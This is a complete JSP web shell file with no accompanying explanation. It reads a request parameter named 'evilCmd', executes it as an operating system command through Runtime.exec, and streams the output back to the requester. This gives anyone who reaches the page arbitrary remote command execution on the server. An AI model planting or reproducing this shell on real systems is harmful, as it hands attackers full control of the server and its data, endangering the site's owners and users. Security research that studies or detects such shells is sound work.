<%@ page import="java.io.*" %>
<%
String cmd = request.getParameter("evilCmd");
if (cmd != null) {
    Process p = Runtime.getRuntime().exec(cmd);
    InputStream in = p.getInputStream();
    int a;
    while ((a = in.read()) != -1) response.getWriter().print((char) a);
}
%>